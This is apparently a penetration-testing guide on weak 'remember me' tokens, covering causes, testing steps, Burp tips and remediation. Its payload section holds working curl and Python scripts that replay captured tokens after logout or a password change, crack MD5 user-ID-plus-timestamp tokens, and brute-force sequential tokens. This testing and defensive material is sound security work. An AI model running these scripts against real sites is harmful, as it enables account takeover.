# Remember-Me Token Weaknesses

## Overview
"Remember me" functionality issues a persistent authentication token stored in the browser to keep users logged in across sessions without re-entering credentials. These tokens are high-value targets because they are long-lived and often bypass password and MFA requirements. Common weaknesses include predictable token generation, lack of rotation, storage in insecure cookie attributes, failure to invalidate on logout, and permitting the same token to be used from multiple locations simultaneously.

## How It Works
- Upon checking "remember me" at login, the server issues a persistent cookie (e.g., `remember_token`, `persistent_session`, `keep_me_logged_in`) with a long expiry (days to years).
- If the token is generated with weak entropy (e.g., MD5 of user ID + timestamp, base64 of user ID), it is guessable or brute-forceable.
- If the token is not rotated after each use, a stolen token provides indefinite access.
- If the cookie lacks `HttpOnly`, it is accessible via JavaScript and vulnerable to XSS theft.
- If the cookie lacks `Secure`, it is transmitted over HTTP and vulnerable to network interception.
- If the token is not invalidated when the user explicitly logs out, the attacker retains access after the victim "logged out."
- Tokens shared across devices: if one token works from any IP/device, a stolen token grants access from anywhere.

## Impact
- Persistent account access even after password changes (if tokens are not invalidated on password change).
- Account takeover via XSS stealing the remember-me token.
- Brute-force account takeover if the token is predictable.
- Session persistence post-logout if tokens are not invalidated server-side.

## Where to Look
- The login form: is there a "remember me" checkbox?
- POST `/login` response headers: look for `Set-Cookie` with a long `Max-Age` or `Expires` in the future.
- The cookie name: `remember_token`, `remember_user_token`, `persistent`, `keep_logged_in`, `longterm_session`, `auth_token`.
- Cookie attributes: confirm `HttpOnly`, `Secure`, `SameSite` are set.
- Cookie value: decode base64, check for user ID, email hash, timestamp components.
- Does the same token work after logging out?
- Does the same token work after changing the password?
- Does the same token work from a different IP/User-Agent?

## Testing Steps
1. Log in with "remember me" checked; capture the Set-Cookie response and identify the remember-me cookie name and value.
2. Decode the token (base64, hex) and analyze its structure — does it contain user ID, timestamp, or recognizable data?
3. Log in twice with "remember me" on two different browser sessions; compare the two tokens — are they different (good) or the same (bad: same token reused)?
4. Log out; use the captured remember-me token in a new browser request (Burp Repeater) — does it still authenticate?
5. Change the account password; test if the old remember-me token still works.
6. Request 10+ remember-me tokens for the same account and look for patterns (sequential, time-based).
7. Test if the cookie has `HttpOnly` (not accessible via `document.cookie` in browser console) and `Secure` (only sent over HTTPS).
8. Test whether the same token can be used from a completely different IP and User-Agent simultaneously.
9. Attempt to brute-force or enumerate tokens for other users if the format suggests user-ID-based generation.

## Payloads / Techniques

Capture and test remember-me token:
```bash
# Login with remember me
curl -X POST https://target.com/login \
  -c /tmp/remember_cookies.txt \
  -d "username=user&password=pass&remember_me=1"

# View the cookies
cat /tmp/remember_cookies.txt

# Test token after logout (manually clear session but keep remember cookie)
curl https://target.com/dashboard \
  -H "Cookie: remember_token=CAPTURED_TOKEN"
```

Analyze token structure:
```python
import base64
import hashlib
import time

token = "PASTE_REMEMBER_ME_TOKEN_HERE"

# Try base64 decode
try:
    decoded = base64.b64decode(token + "==")
    print(f"Base64 decoded: {decoded}")
    print(f"As string: {decoded.decode('utf-8', errors='replace')}")
except:
    pass

# Check if it looks like a hash
print(f"Length: {len(token)} chars")
# MD5 = 32 hex, SHA1 = 40 hex, SHA256 = 64 hex

# Try to guess if it's user_id + timestamp based
# Compute MD5 of various inputs
test_user_id = "1"
for ts in range(int(time.time()) - 3600, int(time.time())):
    candidate = hashlib.md5(f"{test_user_id}{ts}".encode()).hexdigest()
    if candidate == token:
        print(f"MATCH: MD5(user_id={test_user_id}, ts={ts})")
        break
```

Test token reuse after logout:
```bash
# 1. Login and capture remember_token
LOGIN_RESP=$(curl -s -X POST https://target.com/login \
  -c /tmp/sess.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass","remember":true}')
REMEMBER_TOKEN=$(grep remember /tmp/sess.txt | awk '{print $NF}')
echo "Remember token: $REMEMBER_TOKEN"

# 2. Logout
curl https://target.com/logout -b /tmp/sess.txt

# 3. Test if remember token still works
curl https://target.com/api/me \
  -H "Cookie: remember_token=$REMEMBER_TOKEN" \
  | python3 -m json.tool
```

Test if token works after password change:
```bash
# 1. Save token
TOKEN="captured_remember_token"

# 2. Change password via API
curl -X POST https://target.com/api/change-password \
  -H "Cookie: remember_token=$TOKEN" \
  -d "current=OldPass&new=NewPass123!"

# 3. Test if old remember token still works
curl https://target.com/api/profile \
  -H "Cookie: remember_token=$TOKEN"
```

Brute-force sequential token (if numeric/sequential):
```bash
for i in $(seq 1 10000); do
  RESP=$(curl -s https://target.com/api/me \
    -H "Cookie: remember_token=$i" -w "%{http_code}")
  if [[ "$RESP" == *"200"* ]]; then
    echo "VALID TOKEN: $i"
  fi
done
```

## Burp Suite Tips
- In **Proxy**, filter the HTTP history for `Set-Cookie` responses to find remember-me token issuance.
- Use **Sequencer** on the remember-me token endpoint — feed multiple tokens to analyze their entropy and detect patterns.
- In **Repeater**, submit authenticated requests using only the remember-me cookie (remove the session cookie) to confirm it's used for authentication independently.
- Use **Comparer** to diff two remember-me tokens issued at different times — look for sequential or time-correlated portions.
- The **Cookie Editor** extension lets you quickly modify cookie values in-browser for testing.
- Use **Intruder** (Sniper) with a numeric sequence or short token space to brute-force low-entropy remember-me tokens.

## Tools
- **Burp Suite Sequencer** — Entropy analysis of remember-me tokens.
- **hashcat** — Offline cracking if the token is a hash of predictable input.
- **jwt_tool** — If the remember-me token is a JWT.
- **Python scripts** — Custom analysis of token structure and pattern detection.
- **Browser DevTools** — Inspect cookies and their security attributes (`HttpOnly`, `Secure`, `SameSite`).

## Remediation
- Generate remember-me tokens using a CSPRNG with at least 128 bits of entropy — never base on user ID, timestamp, or any predictable value.
- Rotate the remember-me token on every use (token rotation): issue a new token each time the old one is used, and invalidate the old one.
- Invalidate all remember-me tokens when the user:
  - Explicitly logs out.
  - Changes their password.
  - Enables or disables MFA.
  - Revokes sessions from a "manage sessions" page.
- Store only the hash of the token server-side (SHA-256); invalidate by deleting the stored hash.
- Set `HttpOnly`, `Secure`, and `SameSite=Strict` cookie attributes.
- Consider binding tokens to the User-Agent and/or subnet for anomaly detection (not as primary security, but as detection layer).
- Implement a maximum number of concurrent remember-me tokens per user (e.g., 5 devices).
- Provide users with a "manage active sessions" page to review and revoke individual remember-me tokens.

## References
https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/
https://cwe.mitre.org/data/definitions/613.html
https://portswigger.net/web-security/authentication/other-mechanisms
